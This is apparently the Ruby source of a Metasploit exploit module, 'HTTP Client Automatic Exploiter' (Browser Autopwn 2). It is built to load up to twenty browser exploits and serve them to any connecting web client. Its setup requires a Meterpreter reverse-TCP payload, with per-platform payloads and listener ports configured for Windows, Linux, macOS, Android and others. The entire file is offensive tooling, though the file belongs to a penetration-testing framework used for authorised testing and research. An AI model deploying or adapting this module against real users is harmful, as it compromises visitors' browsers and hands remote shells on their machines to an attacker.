##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
  Rank = NormalRanking

  include Msf::Exploit::Remote::BrowserAutopwnv2

  def initialize(info={})
    super(update_info(info,
      'Name'           => "HTTP Client Automatic Exploiter",
      'Description'    => %q{
        Place holder
      },
      'License'        => MSF_LICENSE,
      'Author'         => [ 'sinn3r' ],
      'Targets'        => [ [ 'Automatic', {} ] ],
      'Platform'       => %w{ java linux osx solaris win android firefox },
      'Privileged'     => false,
      'DisclosureDate' => "Feb 5 2014",
      'Targets'        => [ [ 'Automatic', {} ] ],
      'DefaultTarget'  => 0))


    register_advanced_options(get_advanced_options, self.class)

    register_options(
      [
        OptEnum.new('Action', [false, 'Action', 'WebServer', ['WebServer','DefangedDetection'], 'WebServer']),
        OptRegexp.new('Include', [false, 'Pattern search to include specific modules']),
        OptRegexp.new('Exclude', [false, 'Pattern search to exclude specific modules']),
        OptInt.new('MaxExploits', [false, 'Number of browser exploits to load', 20]),
        OptString.new('Content', [false, 'HTML Content', ''])
      ] ,self.class)

    deregister_options('Retries', 'DisablePayloadHandler', 'ContextInformationFile')
  end

  def setup
    if datastore['PAYLOAD'] != 'windows/meterpreter/reverse_tcp'
      msg = "\"set payload\" is disabled: Instead of using \"set payload\", please set PAYLOAD_[platform] "
      msg << "to set a platform-specific payload, and set PAYLOAD_[platform]_LPORT "
      msg << "to set a platform-specific LPORT."
      raise RuntimeError, msg
    end
    super
  end

  def get_advanced_options
    opts = []
    DEFAULT_PAYLOADS.each_pair do |platform, payload_info|
      opts << OptString.new("PAYLOAD_#{platform.upcase}", [true, "Payload for #{platform} browser exploits", payload_info['payload'] ])
      opts << OptInt.new("PAYLOAD_#{platform.upcase}_LPORT", [true, "Payload LPORT for #{platform} browser exploits", payload_info['lport']])
    end

    opts << OptBool.new("RealList", [true, "Show which exploits will actually be served to each client", false])

    opts
  end

  def on_request_exploit(cli, request, target_info)
    serve = build_html(cli, request)
    print_status("Serving exploits...")
    send_exploit_html(cli, serve)
  end


end
